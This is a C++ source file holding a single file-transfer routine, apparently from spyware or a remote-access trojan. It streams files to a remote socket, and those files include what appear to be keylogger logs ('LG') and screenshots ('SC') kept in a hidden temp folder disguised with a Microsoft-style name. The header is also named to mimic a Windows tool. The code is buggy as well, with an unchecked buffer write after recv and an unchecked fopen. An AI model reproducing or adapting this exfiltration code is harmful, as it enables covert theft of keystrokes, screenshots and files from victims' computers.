#include "MSConfig.h"

void transfer(SOCKET& ConnectSocket, char *source, char *sp, int fs, string mode)
{
     char command[4096], response[1024], fn[1024];
     int size, res;
     string totr;

     strcpy(command, source);
     strcat(command, "+");

     send(ConnectSocket, command, (int)strlen(command), 0);
     
     do
     {
                  res = recv(ConnectSocket, response, 1024, 0);
                  response[res] = '\0';
                  totr += response;
     } while (totr[totr.length() - 1] != '+');

     sprintf(command, "%d+",fs);
     send(ConnectSocket, command, (int)strlen(command), 0);
     
     do
     {
                  res = recv(ConnectSocket, response, 1024, 0);
                  response[res] = '\0';
                  totr += response;
     } while (totr[totr.length() - 1] != '+');
     

     if (mode == "WE") sprintf(fn, "%s%s", sp, source);
     else
     {
         GetTempPath(1024, fn);
         if (mode == "LG") strcat(fn, "Microsoft_9021784367548932\\LG\\");
         else if (mode == "SC") strcat(fn, "Microsoft_9021784367548932\\SC\\");
         strcat(fn, source);
     }
     
     FILE * src;
     src = fopen(fn, "rb");
     int n;
     while (!feof(src))
     {
           n = fread(command, sizeof(char), sizeof(command), src);
           send(ConnectSocket, command, n, 0);
     }
     
     do
     {
                  res = recv(ConnectSocket, response, 1024, 0);
                  response[res] = '\0';
                  totr += response;
     } while (totr[totr.length() - 1] != '+');
     
     fclose(src);
     
     return;
}
